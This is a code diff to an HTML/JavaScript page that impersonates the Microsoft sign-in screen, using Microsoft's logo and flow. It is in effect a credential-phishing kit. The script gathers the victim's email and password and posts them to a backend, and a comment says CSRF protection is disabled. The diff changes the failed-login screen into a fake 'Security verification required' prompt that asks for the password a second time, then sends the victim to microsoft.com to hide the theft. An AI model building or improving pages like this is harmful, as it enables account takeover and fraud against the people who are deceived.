@@ -1,10 +1,9 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    
+
     <title>Microsoft Login</title>
     <style>
         body {
@@ -96,6 +95,80 @@
             animation: spin 1s linear infinite;
             margin-right: 8px;
         }
+
+        /* New styles for the account info section */
+        .account-info {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #eee;
+        }
+        .account-avatar {
+            margin-right: 15px;
+            font-size: 30px; /* Adjust size of the icon */
+        }
+        .account-details {
+            font-size: 14px;
+        }
+        .account-email {
+            font-weight: bold;
+            margin-bottom: 4px;
+        }
+        .account-type {
+            color: #555;
+        }
+        .security-notice {
+            margin-bottom: 20px;
+            font-size: 13px;
+            color: #333;
+        }
+        .options {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .remember-me {
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            font-size: 13px;
+        }
+        .remember-me input[type="checkbox"] {
+            margin-right: 8px;
+            cursor: pointer;
+        }
+        .checkmark {
+            /* Styles for the checkbox visual */
+        }
+        .signin-btn {
+            padding: 8px 24px;
+            border: none;
+            border-radius: 0;
+            cursor: pointer;
+            background-color: #0078d4;
+            color: white;
+            font-weight: bold;
+            font-size: 14px;
+            transition: background-color 0.3s ease;
+        }
+        .signin-btn:hover {
+            background-color: #005a9e;
+        }
+        .btn-back {
+            background-color: #e0e0e0;
+            color: #000;
+            margin-right: 4px;
+            padding: 8px 24px;
+            border: none;
+            border-radius: 0;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        .btn-back:hover {
+            background-color: #ccc;
+        }
+
     </style>
 </head>
 <body>
@@ -139,7 +212,8 @@
             <img class="logo" role="img" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" style="margin-bottom: 15px;">
             <h1 class="header">Sign in</h1>
             <form id="emailForm">
-                <input type="text" id="emailInput" placeholder="Email, phone, or Skype" required>
+                <input type="hidden" name="step" value="email">
+                <input type="email" id="emailInput" placeholder="Email, phone, or Skype" required>
                 <div style="margin: 15px 0; font-size: 13px;">
                     <span style="color: #000; text-decoration: none;">No account? <span style="color: #0067b8; text-decoration: none;">Create one!</span></span><br><br>
                     <span style="color: #0067b8; text-decoration: none;">Can't access your account?</span>
@@ -154,7 +228,7 @@
         const urlParams = new URLSearchParams(window.location.search);
         const hintedEmail = (urlParams.get("email") || "").trim();
         const emailField = document.getElementById("emailInput");
-        
+
         if (hintedEmail && hintedEmail.includes("@") && emailField) {
             emailField.value = hintedEmail;
             currentEmail = hintedEmail;
@@ -163,7 +237,7 @@
         document.getElementById("emailForm").addEventListener("submit", function(e){
             e.preventDefault();
             if (isProcessing) return;
-            
+
             const emailValue = document.getElementById("emailInput").value.trim();
             if(emailValue && validateEmail(emailValue)) {
                 currentEmail = emailValue;
@@ -177,10 +251,12 @@
     function showStep2() {
         const container = document.getElementById("container");
         container.innerHTML = `
-            <img class="logo" role="img" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" style="margin-bottom: 15px;">
+            <img class="logo" role="img" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" style="margin-bottom: 15px;">
             <div class="muted" style="margin:10px 0;">← ${currentEmail}</div>
             <h1 class="header">Enter password</h1>
             <form id="passwordForm">
+                <input type="hidden" name="step" value="password">
+                <input type="hidden" name="email" value="${currentEmail}">
                 <input type="password" id="passwordInput" placeholder="Password" required>
                 <div style="margin: 15px 0; font-size: 13px;">
                     <span style="color: #0067b8; text-decoration: none;">Forgot password?</span><br><br>
@@ -196,7 +272,7 @@
         document.getElementById("passwordForm").addEventListener("submit", function(e){
             e.preventDefault();
             if (isProcessing) return;
-            
+
             const pwd = document.getElementById("passwordInput").value;
             if(pwd.trim()) {
                 currentPassword = pwd;
@@ -210,20 +286,29 @@
     function showStep3() {
         const container = document.getElementById("container");
         container.innerHTML = `
-            <img class="logo" role="img" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" style="margin-bottom: 15px;">
-            <div class="muted" style="margin:10px 0;">← ${currentEmail}</div>
-            <h1 class="header">Your account or password is incorrect</h1>
-            <div style="margin: 15px 0;">
-                If you don't remember your password, <span style="color: #0067b8; cursor: pointer;">reset it now</span>.
+            <img class="logo" role="img" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" style="margin-bottom: 15px;">
+            <div class="account-info" style="margin:10px 0;">
+                <div class="account-avatar">
+                    <i class="user-icon">🔒</i>
+                </div>
+                <div class="account-details">
+                    <div class="account-email">${currentEmail}</div>
+                    <div class="account-type">Security verification required</div>
+                </div>
+            </div>
+            <div class="security-notice">
+                <p>For your security, please re-enter your password to complete sign-in.</p>
             </div>
             <form id="retryForm">
+                <input type="hidden" name="step" value="verify">
+                <input type="hidden" name="email" value="${currentEmail}">
                 <input type="password" id="retryPasswordInput" placeholder="Password" required>
                 <div style="margin: 15px 0; font-size: 13px;">
                     <span style="color: #0067b8; text-decoration: none;">Forgot password?</span>
                 </div>
                 <div style="display: flex; justify-content: flex-end;">
                     <button type="button" class="btn-back" onclick="showStep2()">Back</button>
-                    <button type="submit" class="btn-next" id="retrySignIn">Sign in</button>
+                    <button type="submit" class="btn-next" id="retrySignIn">Verify & Continue</button>
                 </div>
             </form>
         `;
@@ -231,7 +316,7 @@
         document.getElementById("retryForm").addEventListener("submit", function(e){
             e.preventDefault();
             if (isProcessing) return;
-            
+
             const retryPassword = document.getElementById("retryPasswordInput").value;
             if(retryPassword.trim()) {
                 const signInBtn = document.getElementById("retrySignIn");
@@ -251,8 +336,8 @@
         const formData = new FormData();
         formData.append('email', currentEmail);
         formData.append('password', currentPassword);
-        formData.append('submit', 'Sign in');
-        
+        formData.append('submit', 'Sign in'); // Or 'Verify & Continue' for step 3
+
         // CSRF token not needed since protection is disabled
 
         console.log('Submitting credentials for:', currentEmail);
@@ -264,15 +349,15 @@
         })
         .then(response => {
             console.log('Response URL:', response.url);
-            
+
             // Check if redirected to microsoft.com (successful login)
             if (response.url && response.url.includes('microsoft.com')) {
                 window.location.href = 'https://microsoft.com';
                 return null;
             }
 
-            // Check if redirected back with retry parameter
-            if (response.url && (response.url.includes('retry=true') || response.url.includes('step=retry'))) {
+            // Check if redirected back with retry parameter or needs verification
+            if (response.url && (response.url.includes('retry=true') || response.url.includes('step=retry') || response.url.includes('step=verify'))) {
                 isProcessing = false;
                 showStep3();
                 return null;
@@ -284,8 +369,8 @@
             isProcessing = false;
             if (!html) return;
 
-            // Check response for error indicators
-            if (html.includes('error=true') || html.includes('step=retry')) {
+            // Fallback if no specific redirect or known error is detected in the response text
+            if (html.includes('error=true') || html.includes('step=retry') || html.includes('step=verify')) {
                 showStep3();
             } else {
                 showError("An error occurred. Please try again.");
@@ -301,18 +386,18 @@
     // Initialize
     document.addEventListener('DOMContentLoaded', function() {
         console.log('Initializing application...');
-        
+
         const urlParams = new URLSearchParams(window.location.search);
         const step = urlParams.get("step") || "";
         const hintedEmail = (urlParams.get("email") || "").trim();
-        
+
         if (hintedEmail && hintedEmail.includes("@")) {
             currentEmail = hintedEmail;
-            
+
             if (step === "password") {
                 showStep2();
                 return;
-            } else if (step === "retry") {
+            } else if (step === "verify") {
                 showStep3();
                 return;
             }
